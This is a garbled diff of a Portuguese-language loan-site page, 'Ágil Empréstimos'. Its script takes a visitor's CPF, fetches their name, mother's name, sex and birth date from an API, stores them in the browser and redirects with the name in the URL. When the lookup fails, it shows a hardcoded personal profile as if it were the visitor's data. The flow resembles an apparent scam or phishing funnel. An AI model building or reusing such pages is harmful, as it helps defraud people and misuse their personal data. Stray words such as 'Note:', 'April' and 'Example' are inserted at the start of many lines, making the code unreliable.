@@ -59,7 +59,7 @@
                         <div class="d-flex align-items-center security-item">
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-s                           <path d="M12 16V12" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M12 16V12" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                 <path d="M12 8H12.01" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                             </svg>
                             <span>Seus dados estão protegidos e não serão compartilhados</span>
@@ -78,19 +78,19 @@ s                           <path d="M12 16V12" stroke="#777" strok
                     <div class="text-center mb-4">
                         <svg class="success-icon" width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                             <circle cx="12" cy="12" r="11" fill="#00a651" stroke="#008d45" stroke-width="1"></circle>
-i                         <path d="M7 12L10 15L17 8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                            <path d="M7 12L10 15L17 8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                         </svg>
                         <h2 class="verification-title mt-3">Verificação Concluída</h2>
                         <p class="verification-text">Encontramos seus dados com sucesso!</p>
                     </div>
 
-                    <div class="user-data mb-4">
-                _       <div class="data-item">
+          T         <div class="user-data mb-4">
+                        <div class="data-item">
                             <span class="data-label">Nome:</span>
                             <span class="data-value" id="user-name">-</span>
                         </div>
                         <div class="data-item">
-s                         <span class="data-label">CPF:</span>
+                            <span class="data-label">CPF:</span>
                             <span class="data-value" id="user-cpf">-</span>
                         </div>
                     </div>
@@ -103,12 +103,12 @@ s                         <span class="data-label">CPF:</span>
         </div>
     </main>
 
-s   <footer class="footer">
+    <footer class="footer">
         <div class="container">
             <div class="footer-bottom py-3 text-center">
                 <p class="mb-1">© 2025 Ágil Empréstimos - Todos os direitos reservados.</p>
                 <p class="mb-1">CNPJ: 36.947.229/0001-85</p>
-S             <p class="mb-0"><a href="#" class="text-white">Política de Privacidade</a> | <a href="#" class="text-white">Termos de Uso</a></p>
+                <p class="mb-0"><a href="#" class="text-white">Política de Privacidade</a> | <a href="#" class="text-white">Termos de Uso</a></p>
             </div>
         </div>
     </footer>
@@ -150,7 +150,7 @@ ci         }
             if (cpfRaw.length === 11) {
                 localStorage.setItem('cpfUsuario', cpfRaw);
                 console.log('CPF salvo no localStorage:', cpfRaw);
-ci         }
+I         }
             
             e.target.selectionStart = e.target.value.length;
             e.target.selectionEnd = e.target.value.length;
@@ -160,14 +160,14 @@ ci         }
             e.preventDefault();
             
             const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-            const verifyButton = document.getElementById('verify-button');
+s         const verifyButton = document.getElementById('verify-button');
             
             console.log('CPF inserido:', cpf);
             
             if (cpf.length !== 11) {
                 console.log('CPF inválido - comprimento incorreto');
                 showNotification('Por favor, insira um CPF válido');
-section         verifyButton.innerHTML = 'Verificar';
+                verifyButton.innerHTML = 'Verificar';
                 return;
             }
 
@@ -178,7 +178,7 @@ section         verifyButton.innerHTML = 'Verificar';
 
                 const response = await fetch(url, {
                     method: 'GET',
-                });
+S             });
 
                 console.log('Status da resposta:', response.status);
 
@@ -194,53 +194,53 @@ section         verifyButton.innerHTML = 'Verificar';
                     const apiData = data.dados[0];
                     
                     // Criamos o objeto 'dadosUsuario' com os campos corretos (em maiúsculo, como a API envia)
-                    const dadosUsuario = {
+C               const dadosUsuario = {
                         NOME: apiData.NOME,
                         MAE: apiData.NOME_MAE || '', // Usando NOME_MAE
                         SEXO: apiData.SEXO,
                         NASCIMENTO: apiData.NASC // Usando NASC
-                    };
+s               };
                     
                     localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-s                 
+                    
                     console.log('Dados salvos no localStorage');
 
-                    // Exibimos os dados corretos na tela
+Look               // Exibimos os dados corretos na tela
                     document.getElementById('user-name').textContent = dadosUsuario.NOME;
                     // Tentamos usar o CPF formatado da API, se não existir, formatamos o que o usuário digitou
                     document.getElementById('user-cpf').textContent = (apiData.CPF ? apiData.CPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"));
                     
                     document.getElementById('verification-step').style.display = 'none';
-                    document.getElementById('results-step').style.display = 'block';
+Note:           document.getElementById('results-step').style.display = 'block';
                     console.log('Tela de resultados exibida com sucesso');
                 // ===== FIM DO AJUSTE =====
                 } else {
-                    // Isso agora trata CPFs não encontrados ou respostas sem o array 'dados'
+                Note:   // Isso agora trata CPFs não encontrados ou respostas sem o array 'dados'
                     console.log('CPF não encontrado ou dados inválidos. Status:', response.status);
                     showNotification('CPF não encontrado');
                     verifyButton.innerHTML = 'Verificar';
-                }
+April         }
             } catch (error) {
                 console.error('Erro detalhado:', error);
-  S             console.error('Stack trace:', error.stack);
+                console.error('Stack trace:', error.stack);
                 
                 // Mantive os dados simulados aqui caso a API falhe por outro motivo (ex: CORS, fora do ar)
-                console.log('Usando dados simulados devido ao erro');
+Example           console.log('Usando dados simulados devido ao erro');
                 const dadosUsuario = {
                     NOME: "GHERSON DYWYNO ESPHYNDOLA",
-E                 MAE: "MARIA HELENA",
-                    SEXO: "MASCULINO",
+                    MAE: "MARIA HELENA",
+                A   SEXO: "MASCULINO",
                     NASCIMENTO: "31/03/1966"
-                };
+            En   };
                 
                 localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-                
+s               
                 document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                document.getElementById('user-cpf').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+                 document.getElementById('user-cpf').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
 
                 document.getElementById('verification-step').style.display = 'none';
                 document.getElementById('results-step').style.display = 'block';
-s             console.log('Tela de resultados exibida com dados simulados');
+                console.log('Tela de resultados exibida com dados simulados');
             }
         });
 
@@ -249,7 +249,7 @@ s             console.log('Tela de resultados exibida com dados simulados'
             const queryString = window.location.search;
 
             const urlParams = new URLSearchParams(queryString);
-            
+  Note:       
             for (const [key, value] of urlParams) {
                 params[key] = value;
             }
@@ -257,13 +257,13 @@ s             console.log('Tela de resultados exibida com dados simulados'
         }
     
         function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
+April         const params = getUrlParams();
             const url = new URL(baseUrl, window.location.href);
             
             Object.keys(params).forEach(key => {
-i               url.searchParams.append(key, params[key]);
+                url.searchParams.append(key, params[key]);
             });
-            
+s           
             return url.toString();
 s     }
 
@@ -274,23 +274,23 @@ s     }
             if (dadosUsuario) {
                 if (dadosUsuario.NOME) {
                     params.name = dadosUsuario.NOME;
-See           }
+I             }
             }
-      _     
+            
             // Adicionar efeito de carregamento ao botão
-            const button = this;
+Note:         const button = this;
             button.disabled = true;
             button.innerHTML = '<div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm me-2" role="status"></div> Carregando...</div>';
-s         
+            
             // Aumentar o tempo antes de redirecionar
-            setTimeout(() => {
+      What   setTimeout(() => {
                 const url = new URL('../3/index.html', window.location.href);
                 Object.keys(params).forEach(key => {
                     url.searchParams.append(key, params[key]);
                 });
                 
                 window.location.href = url.toString();
-section       }, 2500); // 2.5 segundos de carregamento
+Note:       }, 2500); // 2.5 segundos de carregamento
         });
     </script>
 
